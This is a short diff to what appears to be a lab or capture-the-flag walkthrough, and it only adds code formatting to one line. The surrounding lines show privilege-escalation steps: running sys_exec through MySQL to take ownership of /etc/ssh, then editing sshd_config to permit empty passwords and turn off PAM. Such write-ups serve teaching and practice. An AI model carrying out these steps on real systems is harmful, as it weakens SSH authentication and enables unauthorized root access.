@@ -83,7 +83,7 @@ However, we're not actually root yet, jsut able to read the file
 
 `SELECT sys_exec('chown -R john.john /etc/ssh');`
 
-vim /etc/ssh/sshd_config and change PermitEmptyPasswords to yes and change UsePAM to no
+`vim /etc/ssh/sshd_config` and change PermitEmptyPasswords to yes and change UsePAM to no
 
 `mysql -u root -h localhost`
 
